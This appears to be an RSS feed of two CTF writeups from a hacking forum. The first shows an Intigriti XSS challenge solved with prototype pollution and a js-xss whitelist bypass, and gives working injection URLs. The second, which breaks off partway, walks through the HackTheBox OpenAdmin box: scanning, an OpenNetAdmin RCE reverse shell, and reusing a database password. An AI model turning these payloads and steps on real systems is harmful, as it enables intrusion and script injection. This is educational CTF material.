<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:discourse="http://www.discourse.org/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>CTF - 0x00sec - The Home of the Hacker</title>
    <link>https://0x00sec.org/c/ctf/55</link>
    <description>Topics in the &#39;CTF&#39; category </description>
    
      <lastBuildDate>Thu, 02 Jun 2022 22:11:41 +0000</lastBuildDate>
      <atom:link href="https://0x00sec.org/c/ctf/55.rss" rel="self" type="application/rss+xml" />
        <item>
          <title>Intigriti XSS Challenge 0522 Writeup</title>
          <dc:creator><![CDATA[c0wm1lk]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <h1>
<a name="intigriti-xss-challenge-0522-1" class="anchor" href="https://0x00sec.org#intigriti-xss-challenge-0522-1"></a>Intigriti XSS Challenge 0522</h1>
<p>Challenge author: PiyushThePal<br>
Link: <a href="https://challenge-0522.intigriti.io" rel="noopener nofollow ugc">https://challenge-0522.intigriti.io</a></p>
<h2>
<a name="reconnaissance-2" class="anchor" href="https://0x00sec.org#reconnaissance-2"></a>Reconnaissance</h2>
<p>Let’s start by getting an overview of the challenge. When we browse the website we see it’s all static content and not much interesting is going on. The only parameter we control is the <code>?page=1</code> parameter in the URL.</p>
<pre><code class="lang-javascript">var pl = $.query.get('page');
if(pages[pl] != undefined){
    console.log(pages);
    document.getElementById("root").innerHTML = pages['4']+filterXSS(pages[pl]);
} else {
    document.location.search = "?page=1"
}
</code></pre>
<p>At first this code seems secure. The only interesting thing we can find is <code>filterXSS(pages[pl])</code>, we can assume we will have to try and insert XSS into <code>pages[pl]</code> and then we have to bypass the XSS filter.</p>
<p>Let’s take a look at the pages array and see if we can insert HTML code somehow.</p>
<pre><code class="lang-javascript">var pages = {
    1: `HOME
      &lt;h5&gt;Pollution is consuming the world. It's killing all the plants and ruining nature, but we won't let that happen! Our products will help you save the planet and yourself by purifying air naturally.&lt;/h5&gt;`,
    2: `PRODUCTS
      &lt;br&gt;
    &lt;footer&gt;
        &lt;img src="https://miro.medium.com/max/1000/1*Cd9sLiby5ibLJAkixjCidw.jpeg" width="150" height="200" alt="Snake Plant"&gt;&lt;/img&gt;&lt;span&gt;Snake Plant&lt;/span&gt;
      &lt;/footer&gt;
      &lt;footer&gt;
        &lt;img src="https://miro.medium.com/max/1000/1*wlzwrBXYoDDkaAag_CT-AA.jpeg" width="150" height="200" alt="Areca Palm"&gt;&lt;/img&gt;&lt;span&gt;Areca Palm&lt;/span&gt;
      &lt;/footer&gt;
    &lt;footer&gt;
        &lt;img src="https://miro.medium.com/max/1000/1*qn_6G8NV4xg_J0luFbY47w.jpeg" width="150" height="200" alt="Rubber Plant"&gt;&lt;/img&gt;&lt;span&gt;Rubber Plant&lt;/span&gt;
        &lt;/footer&gt;`,
    3: `CONTACT
      &lt;br&gt;&lt;br&gt;
      &lt;b&gt;
        &lt;a href="https://www.facebook.com/intigriticom/"&gt;&lt;img src="https://cdn-icons-png.flaticon.com/512/124/124010.png" width="50" height="50" alt="Facebook"&gt;&lt;/img&gt;&lt;/a&gt;
        &lt;a href="https://www.linkedin.com/company/intigriti/"&gt;&lt;img src="https://cdn-icons-png.flaticon.com/512/61/61109.png" width="50" height="50" alt="LinkedIn"&gt;&lt;/img&gt;&lt;/a&gt;
        &lt;a href="https://twitter.com/intigriti"&gt;&lt;img src="https://cdn-icons-png.flaticon.com/512/124/124021.png" width="50" height="50" alt="Twitter"&gt;&lt;/img&gt;&lt;/a&gt;
        &lt;a href="https://www.instagram.com/hackwithintigriti/"&gt;&lt;img src="https://cdn-icons-png.flaticon.com/512/174/174855.png" width="50" height="50" alt="Instagram"&gt;&lt;/img&gt;&lt;/a&gt;
      &lt;/b&gt;
      `,
    4: `
      &lt;div class="dropdown"&gt;
        &lt;div id="myDropdown" class="dropdown-content"&gt;
          &lt;a href = "?page=1"&gt;Home&lt;/a&gt;
          &lt;a href = "?page=2"&gt;Products&lt;/a&gt;
          &lt;a href = "?page=3"&gt;Contact&lt;/a&gt;
        &lt;/div&gt;
      &lt;/div&gt;`
};
</code></pre>
<p>There is no way to insert content into this object so we’re also kind of stuck here. However, it is worth noting that pages is an object, and not an array. Normally an array would’ve been the better solution so the fact that an object is used is somewhat interesting, although not entirely out of the ordinary.</p>
<p>Now the high level code we’ve seen has no obvious security issues, so it’s time to take a look at the implementations.</p>
<pre data-code-wrap="html"><code class="lang-nohighlight">&lt;script src="https://cdnjs.cloudflare.com/ajax/libs/js-xss/0.3.3/xss.min.js"&gt;&lt;/script&gt;
&lt;script src="https://code.jquery.com/jquery-3.5.1.js"&gt;&lt;/script&gt;
&lt;script&gt;
    /**
 * jQuery.query - Query String Modification and Creation for jQuery
 * Written by Blair Mitchelmore (blair DOT mitchelmore AT gmail DOT com)
 * Licensed under the WTFPL (http://sam.zoy.org/wtfpl/).
 * Date: 2009/8/13
 *
 * @author Blair Mitchelmore
 * @version 2.2.3
 *
 **/
 (javascript code here)
 &lt;/script&gt;
</code></pre>
<div class="md-table">
<table>
<thead>
<tr>
<th>Library</th>
<th>Findings</th>
</tr>
</thead>
<tbody>
<tr>
<td>XSS.js 0.3.3</td>
<td>This seems interesting, taking a look at the <a href="https://www.npmjs.com/package/xss?activeTab=versions" rel="noopener nofollow ugc">version history</a> the package seems outdated and probably has been put in here for a reason. Doing some initial research we find 2 vulnerabilities: <a href="https://snyk.io/test/npm/xss/0.3.3" rel="noopener nofollow ugc">ReDoS</a> and <a href="https://www.sourceclear.com/vulnerability-database/security/cross-site-scripting-xss-due-to/javascript/sid-2309/" rel="noopener nofollow ugc">Sanetization Bypass</a>.</td>
</tr>
<tr>
<td>jQuery 3.5.1</td>
<td>This version was released pretty recently, only 2 years ago. It’s pretty normal to use long term stable releases but perhaps there is a vulnerability for this package. Taking a look at the <a href="https://www.cvedetails.com/vulnerability-list/vendor_id-6538/Jquery.html" rel="noopener nofollow ugc">CVE database</a> there are multiple vulnerabilities. But when we take a look at what versions are affected, we can see a couple where jQuery was affected below versions 3.5.0, so we can’t find anything about the version we’re currently using.</td>
</tr>
<tr>
<td>jQuery.query 2.2.3</td>
<td>This <a href="https://plugins.jquery.com/query-object/" rel="noopener nofollow ugc">plugin</a> seems quite outdated. Doing some reconnaissance we find out that the <a href="https://gist.github.com/bdimcheff/2975441?permalink_comment_id=3730184#gistcomment-3730184" rel="noopener nofollow ugc">SET function is vulnerable to prototype pollution</a>.</td>
</tr>
</tbody>
</table>
</div><h2>
<a name="finding-the-vulnerability-3" class="anchor" href="https://0x00sec.org#finding-the-vulnerability-3"></a>Finding the vulnerability</h2>
<p>During our reconnaissance we found out that jQuery.query’s SET function was vulnerable to prototype pollution. When we take a look at our code the SET function never gets called. However, this does indicate that there may be another prototype pollution vulnerability.</p>
<pre><code class="lang-javascript">var pl = $.query.get('page');
</code></pre>
<p>We call the get function of the library, whose code is pasted down below.</p>
<pre><code class="lang-javascript">GET: function(key) {
    if (!is(key)) return this.keys;
    var parsed = parse(key), base = parsed[0], tokens = parsed[1];
    var target = this.keys[base];
    while (target != null &amp;&amp; tokens.length != 0) {
      target = target[tokens.shift()];
    }
    return typeof target == 'number' ? target : target || "";
},
get: function(key) {
    var target = this.GET(key);
    if (is(target, Object))
      return jQuery.extend(true, {}, target);
    else if (is(target, Array))
      return target.slice(0);
    return target;
},
</code></pre>
<p>Let’s start by analyzing this code. We see that the <code>get</code> function calls the <code>GET</code> function. When we take a look at what the <code>GET</code> function does, it’s mostly just parsing all of the data. The next line of the <code>get</code> function calls <code>is(target, Object)</code>. The <code>is</code> function is as follows:</p>
<pre><code class="lang-javascript">var is = function(o, t) {
  return o != undefined &amp;&amp; o !== null &amp;&amp; (!!t ? o.constructor == t : true);
};
</code></pre>
<p>So all this code really does is check if the target is of type Object. So what is considered an object?</p>
<pre><code class="lang-javascript">is(4, Object) // false
is("hey", Object) // false
is([], Object) // false
is({}, Object) // true
is(new Object, Object) // true
</code></pre>
<p>Because the application is expecting a page number and not an object, I believe this could be a possible attack vector. Therefore let’s investigate further and see if we can satisfy this condition.</p>
<p>So in order to do that, we somehow need to pass in an object through a GET request. If we google “pass in object get parameter” then we don’t get a lot of relevant results. They talk mostly about how to do it through a serialized JSON object. We do not have any deserialization going on so this won’t do.</p>
<p>So it’s time to experiment a bit. I download the website locally and open up the source code to make some changes. I start by changing the <code>get</code> function and adding some console output;</p>
<pre><code class="lang-javascript">get: function(key) {
    var target = this.GET(key);
    console.dir("target", target); // added
    console.dir("isobject?", is(target, Object)); // added
    if (is(target, Object)) {
        console.dir("extends", jQuery.extend(true, {}, target)); // added
        return jQuery.extend(true, {}, target);
    } // we needed to add braces
    else if (is(target, Array))
        return target.slice(0);
    return target;
},
</code></pre>
<p>Now if we go to the website we can open the console and see the following output:</p>
<pre><code class="lang-auto">target &lt;empty string&gt;
isobject? false
target 1
isobject? false
</code></pre>
<p>Let’s try passing in an array now. So let’s go to <code>?page[]=1&amp;page[]=2</code> and see what we get.</p>
<pre><code class="lang-auto">target Array [ 1, 2 ]
isobject? false
target 1
isobject? false
</code></pre>
<p>So it seems like we got redirected because <code>pages[ [1,2] ]</code> is equals to <code>undefined</code>. Let’s modify the code to remove the redirection.</p>
<pre><code class="lang-javascript">var pl = $.query.get('page');
if(pages[pl] != undefined){
    console.log(pages);
    document.getElementById("root").innerHTML = pages['4']+filterXSS(pages[pl]);
} else {
    //document.location.search = "?page=1" // removed
    console.log("Redirection blocked.") // added
}
</code></pre>
<p>Now what would happen if we passed in a dictionary instead of an array? Let’s visit <code>?page[a]=1&amp;page[b][c]=2</code></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/0/f/0fe3c228ccd3f9377c15e9ab24a54d1250dbd22b.png" alt="" data-base62-sha1="2gz8cnG3pW6bGOQ9eadvngdgJAL" width="306" height="170"></p>
<p>We have successfully passed in an object and passed the condition. Now let’s see if we can <a href="https://learn.snyk.io/lessons/prototype-pollution/javascript/" rel="noopener nofollow ugc">pollute the prototype</a> by going to the following URL: <code>?page[__proto__][a]=1</code></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/c/4/c488be0ca619d0465834c2282e415a4c558ffda0.png" alt="" data-base62-sha1="s2Cyjip5pV9Kc5fg1gfsC3uzqdG" width="386" height="171"></p>
<p>We have succesfully polluted the prototype of all objects. <img src="https://0x00sec.org/images/emoji/twitter/sparkles.png?v=12" title=":sparkles:" class="emoji" alt=":sparkles:" loading="lazy" width="20" height="20">Vulnerability found!<img src="https://0x00sec.org/images/emoji/twitter/sparkles.png?v=12" title=":sparkles:" class="emoji" alt=":sparkles:" loading="lazy" width="20" height="20"> So let’s try doing some XSS and solving the challenge.</p>
<h2>
<a name="lets-inject-some-content-4" class="anchor" href="https://0x00sec.org#lets-inject-some-content-4"></a>Let’s inject some content!</h2>
<p>So our goal is to exploit the following piece of code with prototype pollution to insert any HTML code we may want:<br>
<code>document.getElementById("root").innerHTML = pages['4']+filterXSS(pages[pl]);</code></p>
<p>So let’s try seeing what happens if we do the the following url:<br>
<code>?page[__proto__][a]=I am vulnerable!&amp;page=a</code></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/1/3/13e311cc801249520e309cf8eff2a31efdecca9c.png" alt="" data-base62-sha1="2PVz6iLA3VyBO5Q7Izrzxdz3JUw" width="546" height="273"></p>
<h2>
<a name="bypassing-the-xss-filter-5" class="anchor" href="https://0x00sec.org#bypassing-the-xss-filter-5"></a>Bypassing the XSS filter</h2>
<p>We have successfully injected a page in the pages’ prototype and then accessed it. However as <code>filterXSS</code> hints, there will be some XSS filtering. So let’s just try injecting some HTML and seeing how it gets filtered.<br>
<code>?page[__proto__][a]=&lt;img src%3Dx onerror%3D"alert(document.domain)"&gt;&amp;page=a</code></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/8/28033b463e0e8dfac7ea6b843a65c1842eab44d2.png" alt="" data-base62-sha1="5HY1nXpQ5XIP8FiNSGZ3FqaKEPE" width="406" height="154"></p>
<p>Let’s start by <a href="https://beautifier.io/" rel="noopener nofollow ugc">beautifying</a> <code>xss.js</code> and inspecting the <code>FilterXSS</code> function.</p>
<pre><code class="lang-javascript">function FilterXSS(options) {
    options = shallowCopyObject(options || {});
    if (options.stripIgnoreTag) {
        if (options.onIgnoreTag) {
            console.error('Notes: cannot use these two options "stripIgnoreTag" and "onIgnoreTag" at the same time')
        }
        options.onIgnoreTag = DEFAULT.onIgnoreTagStripAll
    }
    options.whiteList = options.whiteList || DEFAULT.whiteList;
    options.onTag = options.onTag || DEFAULT.onTag;
    options.onTagAttr = options.onTagAttr || DEFAULT.onTagAttr;
    options.onIgnoreTag = options.onIgnoreTag || DEFAULT.onIgnoreTag;
    options.onIgnoreTagAttr = options.onIgnoreTagAttr || DEFAULT.onIgnoreTagAttr;
    options.safeAttrValue = options.safeAttrValue || DEFAULT.safeAttrValue;
    options.escapeHtml = options.escapeHtml || DEFAULT.escapeHtml;
    this.options = options;
    if (options.css === false) {
        this.cssFilter = false
    } else {
        options.css = options.css || {};
        this.cssFilter = new FilterCSS(options.css)
    }
}
</code></pre>
<p>So as we can see there are quite a few options which we can set through prototype pollution. What really piqued my interest is the whiteList property. Let’s start by taking a look at what exactly it does.</p>
<pre><code class="lang-javascript">var retHtml = parseTag(html, function(sourcePosition, position, tag, html, isClosing) {
    var info = {
        sourcePosition: sourcePosition,
        position: position,
        isClosing: isClosing,
        isWhite: tag in whiteList // &lt;--------------- WHITELIST HERE
    };
    var ret = onTag(tag, html, info);
    if (!isNull(ret)) return ret;
    if (info.isWhite) {
        if (info.isClosing) {
            return "&lt;/" + tag + "&gt;"
        }
        var attrs = getAttrs(html);
        var whiteAttrList = whiteList[tag]; // &lt;----- WHITELIST HERE
        var attrsHtml = parseAttr(attrs.html, function(name, value) {
            var isWhiteAttr = _.indexOf(whiteAttrList, name) !== -1;
            var ret = onTagAttr(tag, name, value, isWhiteAttr);
            if (!isNull(ret)) return ret;
            if (isWhiteAttr) {
                value = safeAttrValue(tag, name, value, cssFilter);
                if (value) {
                    return name + '="' + value + '"'
                } else {
                    return name
                }
            } else {
                var ret = onIgnoreTagAttr(tag, name, value, isWhiteAttr);
                if (!isNull(ret)) return ret;
                return
            }
        });
        var html = "&lt;" + tag;
        if (attrsHtml) html += " " + attrsHtml;
        if (attrs.closing) html += " /";
        html += "&gt;";
        return html
    } else {
        var ret = onIgnoreTag(tag, html, info);
        if (!isNull(ret)) return ret;
        return escapeHtml(html)
    }
}, escapeHtml);
</code></pre>
<p>So interestingly, the <code>img</code> tag does not get filtered, it seems like the default whitelist allows this tag to pass through the XSS filter. However we can inject any tag by adding it to the prototype.</p>
<p><code>?page[__proto__][script]=1&amp;page[__proto__][a]=&lt;script&gt;alert(document.domain)&lt;/script&gt;&amp;page=a</code></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/3X/9/6/96f511770c06d0ec86dbf5a79ec75af396150ce9.png" alt="" data-base62-sha1="lxqFXFvGfAniaVcwy949559ngnv" width="357" height="175"></p>
<p>However, scripts don’t get execute if they’re added with <code>.innerHTML</code> so we need to use a different tag. My goal is to inject the following piece of HTML code: <code>&lt;img src=x onerror="alert(document.domain)"&gt;</code>, which will execute if it’s added with <code>.innerHTML</code>. But as seen before, all tags get stripped, so let’s figure out how to bypass the tag whitelist.</p>
<pre><code class="lang-javascript">// tag = "img"
var whiteAttrList = whiteList[tag];
var isWhiteAttr = _.indexOf(whiteAttrList, name) !== -1;
</code></pre>
<p>So at first this seems like a problem, because <code>Array.indexOf</code> does not check the prototype of an array. However, even though <code>whiteAttrList</code> is presumed to be an array, it does not necessarily need to be. We can turn it into a string, which functions a lot like an array, which is why <code>Array.indexOf(string, needle)</code> will also work.</p>
<p>So let’s add <code>src</code> and <code>onerror</code> to the whitelist with the following parameter:<br>
<code>?page[__proto__][whiteList][img]=srconerror</code></p>
<p>So let’s try the previous payload with the bypass prepended.</p>
<p><code>?page[__proto__][whiteList][img]=srconerror&amp;page[__proto__][a]=&lt;img src%3Dx onerror%3D"alert(document.domain)"&gt;&amp;page=a</code></p>
<p><img src="https://0x00sec.org/images/emoji/twitter/sparkles.png?v=12" title=":sparkles:" class="emoji" alt=":sparkles:" loading="lazy" width="20" height="20">Success!<img src="https://0x00sec.org/images/emoji/twitter/sparkles.png?v=12" title=":sparkles:" class="emoji" alt=":sparkles:" loading="lazy" width="20" height="20"><br>
<img src="https://0x00sec.s3.amazonaws.com/original/3X/c/e/ce77fbfc935c69b917c8139cbb8521fd1f4892dd.png" alt="" data-base62-sha1="tsvqio3OHqm29tBGlekyygFQzZr" width="442" height="155"></p>
            <p><small>6 posts - 3 participants</small></p>
            <p><a href="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592</link>
          <pubDate>Thu, 02 Jun 2022 22:11:41 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-29592</guid>
          <source url="https://0x00sec.org/t/intigriti-xss-challenge-0522-writeup/29592.rss">Intigriti XSS Challenge 0522 Writeup</source>
        </item>
        <item>
          <title>Hackthebox : openadmin writeup</title>
          <dc:creator><![CDATA[jeff]]></dc:creator>
          <category>Hackthebox Writeups</category>
          <description><![CDATA[
            <p>recently, hackthebox started an event called <code>take it easy</code>, where it made a bunch of retired easy machine accessible to everyone, so here’s my write up for the first box I’ve rooted in the event</p>
<h1>
<a name="reconnaissance-1" class="anchor" href="https://0x00sec.org#reconnaissance-1"></a>Reconnaissance</h1>
<p>I first added the machine in my hosts file as <code>openadmin.htb</code> then ran a regular nmap scan to get the open ports</p>
<pre><code class="lang-bash">$ sudo nmap openadmin.htb -v -oN ports
# Nmap 7.91 scan initiated Fri Jul  9 02:07:40 2021 as: nmap -v -oN ports openadmin.htb
Increasing send delay for 10.10.10.171 from 0 to 5 due to 42 out of 140 dropped probes since last increase.
Increasing send delay for 10.10.10.171 from 5 to 10 due to 213 out of 709 dropped probes since last increase.
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.099s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Fri Jul  9 02:08:00 2021 -- 1 IP address (1 host up) scanned in 20.27 seconds
</code></pre>
<p>then a detailed scan against the 2 found services</p>
<pre><code class="lang-bash">$ nmap -v -sC -sV -p 80,22 -oN detailed_scan openadmin.htb
# Nmap 7.91 scan initiated Fri Jul  9 02:11:41 2021 as: nmap -v -sC -sV -p 80,22 -oN detailed_scan openadmin.htb
Nmap scan report for openadmin.htb (10.10.10.171)
Host is up (0.100s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul  9 02:11:54 2021 -- 1 IP address (1 host up) scanned in 13.16 seconds
</code></pre>
<h1>
<a name="http-enumeration-2" class="anchor" href="https://0x00sec.org#http-enumeration-2"></a>http enumeration</h1>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/9/7/97dbb374db7a0f08febb5209774930ac8e89fc9e.png" data-download-href="/uploads/short-url/lFoNVqOuFoKh1hmCLLawfVik4Lc.png?dl=1" title="default appache page" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/9/7/97dbb374db7a0f08febb5209774930ac8e89fc9e_2_690x360.png" alt="default appache page" data-base62-sha1="lFoNVqOuFoKh1hmCLLawfVik4Lc" width="690" height="360" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/9/7/97dbb374db7a0f08febb5209774930ac8e89fc9e_2_690x360.png, https://0x00sec.s3.amazonaws.com/optimized/3X/9/7/97dbb374db7a0f08febb5209774930ac8e89fc9e_2_1035x540.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/9/7/97dbb374db7a0f08febb5209774930ac8e89fc9e.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/9/7/97dbb374db7a0f08febb5209774930ac8e89fc9e_2_10x10.png"></a></div><p></p>
<p>the box was serving a default apache index with no <code>robots.txt</code> whatsoever, so I’ve run some bruteforces to find hidden files/directories and I end up with the following results</p>
<pre><code class="lang-bash">[18:31:22] 301 -  314B  - /music  -&gt;  http://openadmin.htb/music/

[18:44:12] 200 -    4KB - /ona/login.php
[18:44:13] 200 -  127B  - /ona/logout.php
[18:44:15] 200 -   24KB - /ona/index.php
[18:45:57] 200 -    2B  - /ona/shell.php

[18:31:28] 301 -  316B  - /artwork  -&gt;  http://openadmin.htb/artwork/
[18:53:42] 200 -    9KB - /artwork/contact.html
[18:53:46] 200 -   11KB - /artwork/about.html
[18:53:48] 200 -  931B  - /artwork/main.html
[18:53:49] 200 -   11KB - /artwork/blog.html
[18:53:52] 200 -   11KB - /artwork/services.html
[18:53:53] 200 -  410B  - /artwork/readme.txt

[19:00:10] 301 -  315B  - /sierra  -&gt;  http://openadmin.htb/sierra/
[19:05:49] 200 -   42KB - /sierra/index.html
[19:05:51] 200 -   15KB - /sierra/contact.html
[19:06:07] 200 -   20KB - /sierra/blog.html
[19:06:08] 200 -   20KB - /sierra/about-us.html
[19:06:26] 200 -   22KB - /sierra/service.html
[19:06:31] 200 -   13KB - /sierra/portfolio.html
[19:07:46] 200 -    0B  - /sierra/contact_process.php
</code></pre>
<p>when you browse to <code>/music/login.php</code> you get directed to <code>/ona</code> which had the following page</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/f/0fe2d89261049ec3262ac3b5fe33fab640c5ba7b.png" data-download-href="/uploads/short-url/2gxaZFUfaWqT1T9vBZg2U2wk8WL.png?dl=1" title="insert ona.png" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/f/0fe2d89261049ec3262ac3b5fe33fab640c5ba7b_2_690x358.png" alt="insert ona.png" data-base62-sha1="2gxaZFUfaWqT1T9vBZg2U2wk8WL" width="690" height="358" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/f/0fe2d89261049ec3262ac3b5fe33fab640c5ba7b_2_690x358.png, https://0x00sec.s3.amazonaws.com/optimized/3X/0/f/0fe2d89261049ec3262ac3b5fe33fab640c5ba7b_2_1035x537.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/f/0fe2d89261049ec3262ac3b5fe33fab640c5ba7b.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/0/f/0fe2d89261049ec3262ac3b5fe33fab640c5ba7b_2_10x10.png"></a></div><p></p>
<p>this page disclose a bunch of info, first the domain <code>openadmin.htb</code> which we’ve already guessed, a mysql service running on localhost with the user <code>ona_sys</code>, and that we’re running on version v18.1.1  <b>which is not the latest version</b>, and a download link which revealed that the website us running an IP address management system called OpenNetAdmin</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/2/c2eacedc2782d836f76a9625cd2f8a5a5bba3067.png" data-download-href="/uploads/short-url/rOjHB3ct6SZayDx90ulD2werqZN.png?dl=1" title="the IP address management system" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/2/c2eacedc2782d836f76a9625cd2f8a5a5bba3067_2_690x356.png" alt="the IP address management system" data-base62-sha1="rOjHB3ct6SZayDx90ulD2werqZN" width="690" height="356" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/2/c2eacedc2782d836f76a9625cd2f8a5a5bba3067_2_690x356.png, https://0x00sec.s3.amazonaws.com/optimized/3X/c/2/c2eacedc2782d836f76a9625cd2f8a5a5bba3067_2_1035x534.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/2/c2eacedc2782d836f76a9625cd2f8a5a5bba3067.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/c/2/c2eacedc2782d836f76a9625cd2f8a5a5bba3067_2_10x10.png"></a></div><p></p>
<p>luckily for us this version had a vulnerability that led to remote code excution</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/9/494e82f3cc3278d4e743866104da7fdc68279d7c.png" data-download-href="/uploads/short-url/asv43SyUa36p9bMxnRbXP32F9Q8.png?dl=1" title="openNetAdmin remote code excution" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/9/494e82f3cc3278d4e743866104da7fdc68279d7c_2_690x357.png" alt="openNetAdmin remote code excution" data-base62-sha1="asv43SyUa36p9bMxnRbXP32F9Q8" width="690" height="357" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/9/494e82f3cc3278d4e743866104da7fdc68279d7c_2_690x357.png, https://0x00sec.s3.amazonaws.com/optimized/3X/4/9/494e82f3cc3278d4e743866104da7fdc68279d7c_2_1035x535.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/9/494e82f3cc3278d4e743866104da7fdc68279d7c.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/4/9/494e82f3cc3278d4e743866104da7fdc68279d7c_2_10x10.png"></a></div><p></p>
<p>now I just used the exploit in <a href="https://github.com/amriunix/ona-rce" rel="noopener nofollow ugc">this repo</a> to get a reverse shell</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/7/47a99fb283c962bc0bdeb510c8320c4e47f34e65.png" data-download-href="/uploads/short-url/adXjHrXg707NmPcT2VjFt4g5Ua1.png?dl=1" title="getting a reverse shell" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/7/47a99fb283c962bc0bdeb510c8320c4e47f34e65_2_690x386.png" alt="getting a reverse shell" data-base62-sha1="adXjHrXg707NmPcT2VjFt4g5Ua1" width="690" height="386" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/7/47a99fb283c962bc0bdeb510c8320c4e47f34e65_2_690x386.png, https://0x00sec.s3.amazonaws.com/optimized/3X/4/7/47a99fb283c962bc0bdeb510c8320c4e47f34e65_2_1035x579.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/7/47a99fb283c962bc0bdeb510c8320c4e47f34e65.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/4/7/47a99fb283c962bc0bdeb510c8320c4e47f34e65_2_10x10.png"></a></div><p></p>
<h1>
<a name="www-data-3" class="anchor" href="https://0x00sec.org#www-data-3"></a>www-data</h1>
<p>after getting in on the box I found some creds in <code>/opt/ona/www/local/config/database_settings.inc.php</code></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/5/25f6df8f667f96d50aef6a1462ff2c60842c2a32.png" data-download-href="/uploads/short-url/5pQAzReNiexDXBICv1iZHVyWmPg.png?dl=1" title="database password" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/2/5/25f6df8f667f96d50aef6a1462ff2c60842c2a32.png" alt="database password" data-base62-sha1="5pQAzReNiexDXBICv1iZHVyWmPg" width="690" height="386" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/2/5/25f6df8f667f96d50aef6a1462ff2c60842c2a32_2_10x10.png"></a></div><p></p>
<p>I’ve also found 2 users on the box, and the database password turned out to be re-used as jimmy’s</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/8/9/898fcfcf72613a9e98ca9217f3a70048e756391b.png" data-download-href="/uploads/short-url/jCVwMpQfFo4i2e3mNgYsDu2nCFJ.png?dl=1" title="other users" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/8/9/898fcfcf72613a9e98ca9217f3a70048e756391b.png" alt="other users" data-base62-sha1="jCVwMpQfFo4i2e3mNgYsDu2nCFJ" width="690" height="93" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/8/9/898fcfcf72613a9e98ca9217f3a70048e756391b_2_10x10.png"></a></div><p></p>
<h1>
<a name="jimmy-4" class="anchor" href="https://0x00sec.org#jimmy-4"></a>jimmy</h1>
<p>I’ve logged in trough ssh to get a nicer shell, then found an internal http server running on port 52846, hosted on <code>/var/www/internal/</code></p>
